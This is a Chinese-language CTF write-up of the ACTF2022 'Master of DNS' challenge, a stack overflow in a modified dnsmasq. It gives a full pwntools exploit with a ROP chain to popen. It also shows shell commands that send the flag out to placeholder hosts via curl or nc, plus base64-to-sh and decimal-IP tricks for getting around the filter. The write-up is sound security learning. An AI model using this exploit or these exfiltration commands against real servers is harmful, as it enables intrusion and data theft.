---
layout: article
pageview: true
key: 2022-07-22-actf2022-master-of-dns
title: ACTF2022-MasterOfDns题解
author: Ch4rc0al
categories: 
    - WriteUps
tags: 
    - CTF
    - Pwn
---

这题真是令我收获良多，学到很多新姿势。

本来是Mark佬复现的一道题目，鄙人随口说到~~32位的rop还不秒了？~~，结果猛调了两天，令人感叹😋。
<!--more-->

### 初见题目

[题目连接](https://adworld.xctf.org.cn/match/list?event_hash=ba9b2b4c-7265-45ce-aa4b-c917bc5ce1bc.event)

题目环境32位，没开`pie`和`canary`，根据题目给的README可以发现这是一个功能完备的DNS服务器，可以正常的dig。通过IDA打开后发现十分复杂，一下子无法确定漏洞在那个函数。

题目给了提示说源代码可以参考`dnsmasq`，我们通过文件中的字符串可以确定版本为`2.86`，编译环境`Ubuntu20`，遂编译一份和题目环境一样的可执行文件出来。

### 编译&Bindiff比较

我们可以在`dnsmasq`官网找到`2.86`版本的源代码，然后修改`Makefile`文件，令其编译参数如下
```
CFLAGS        = -Wall -W -fno-stack-protector -m32
LDFLAGS       = -m32 -no-pie
```
这里需要去掉`CFLAGS`里的`-O2`优化选项，如果有这一选项，编译出的文件与题目文件相比有43处大的函数不同，而去掉后只有2处，显然题目文件也去掉了该选项。

修改好后直接`make`即可编译，输出文件在`src/dnsmasq`。

我们可以使用`Bindiff`来方便的比较两个`elf`文件之间的区别，我们可以看到两个文件之间大约有10个相似度不为1的函数。我们双击点开对比，发现又一个函数只在结尾增加了一次`memcpy`，我们可以确定这里就是栈溢出的漏洞点。

![image.png](https://s2.loli.net/2022/07/22/nLhwyH3q56UovIi.png)

![image.png](https://s2.loli.net/2022/07/22/vGfEpxlACc3UBrn.png)

### 调试漏洞点

找到漏洞点后我们开始判断溢出的参数，通过阅读源代码以及`gdb`调试后，我们发现这里的`memcpy`会将我们请求中的域名部分复制到栈上去，我们只需要用`pwntools`来模拟DNS请求即可触发漏洞。

在~~学习了DNS报文格式~~WireShark抓包后，我们拿到了正常DNS请求的头和尾，中间的域名部分即是我们需要构造的`payload`，然而这部分有诸多限制。

例如我们要查询的域名是`baidu.com`，在报文中写成`\x05baidu\x03com\x00`，中间的`.`被替换为长度，而且每一节的长度最大为`0x3f`，所以我们的报文中间不能出现`\x00`和`\x2e`(chr(0x2e)='.')，而且长度表示与后面的字符串长度必须对应，否则都不能通过检查。

在用`gdb`调试程序时，需要切换为`root`用才能`attach`到程序，而且不能通过`gdb.debug()`来启动、调试程序，所以我创建了一个新的脚本来自动获取程序的`pid`并自动`attach`，结束调试后自动`kill`，需要在`root`用户下执行.

```shell
#!/bin/sh
port=9999
pid=$(netstat -nlp | grep :$port | awk '{print $7}' | awk -F"/" '{ print $1 }');
gdb -p $pid -iex="b *0x0804F444";

read -p "Press any key to resume ..." tmp;

if [  -n  $pid  ];  then
    kill  -9  $pid;
fi
```

由于我们是网络发包请求，所以不能通过什么途径来泄露`libc`地址，进一步使用`system`函数。我们查找程序的`plt`表，发现有一个`popen`函数可以利用，这个函数的效果与`system`类似，额外需要一个"r"或“w”字符串地址作为参数。

由于是32位环境，参数需要放在栈里，而我们既不知道栈地址，也不能找到合适的`gadget`来使用。这里我们可以通过IDA来找到程序里调用`popen`函数的相关汇编，可以找到如下代码
```
push edx;
push eax;
call popen;
```
这样我们不需要知道栈地址，只需要让`eax`为命令地址，`edx`为"r"或"w"字符串的地址即可。

而恰好`edx`里存着我们输入内容的附近的栈地址，我们通过一些`gadget`操作一番，即可设置`eax`寄存器。而字符串"r"也可以在`bss`段搜到，如此一来我们只需要反弹shell或反弹flag。

### 🐖🖊操作反弹flag


当时在这一步卡了好久，因为不管使用``curl(wget) aaa:bbb/`cat flag` `` 还是`cat flag|nc aaa bbb` 都只能建立连接而无法获取flag内容，最后使用``curl aaa:bbb/`pwd` ``测试才发现`popen`后的目录为根目录而不是启动的目录，没有flag文件自然不能获取内容。。。

这里介绍两种反弹flag的命令写法，由于我们的`payload`不能出现`.`符号，而这又是ip或域名中必备的组件，所以有以下方法绕过

1. Mark佬的方法，我们先将反弹flag命令用base64编码，比如说编码后的结果为`ABCD==`，那么`payload`就为`echo ABCD==|base64 -d|sh`
2. 鄙人的方法，其实ip可以写成10进制的方式，`1.2.3.4`转化为10进制的方法是`4+3*256+2*256^2+1*256^3`，结果为`16909060`，代替正常命令中的ip即可

### 完整exp
```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
context(arch='i386')
# context.terminal=['tmux','splitw','-h']

context.log_level = 'debug'


local = 0
_elf = './dns'
_libc = ''
_addr = '127.0.0.1'
_port = 9999


def getConn():
    if local == 1:
        return process(_elf)
    else:
        return remote(_addr, _port, typ='udp')


def debug(p, cmd=None):
    gdb.attach(p, cmd)
    pause()


r = process([_elf, '-C', './dns.conf'])
pause()



p = getConn()
elf = ELF(_elf)
ret=0x0804a00e
syscall=0x08054e54
p_eax=0x08059d44

str_r=0x80a650c

popen=0x08071802

pay=b''
pay+=(b'\x3f'+b'\xff'*0x3f)*14 #0x380
pay += b'\x3f'*2+p32(0xdeadbeef)+(p32(0x08059d44)+p32(0xffffffff-0x1f)+p32(0x0804b639)+p32(0xdeadbeef)*6+p32(0x0807ec72)+p32(str_r)+p32(popen)).ljust(0x3f-5, b'\xff')
pay += b'\x1f'+b'curl xxx:xxx/`cat flag`'  # 这里的0x1f为后面指令的长度+1(包含下一行的\x00)
pay += b'\x00'



payload = b''
payload += b'\xde\xad'  # ID
payload += b'\x01\x20'  # Flags
payload += b'\x00\x01\x00\x00\x00\x00\x00\x01'
payload += pay
payload += b'\x00\x01'
payload += b'\x00\x01'

p.send(payload)
p.interactive()
```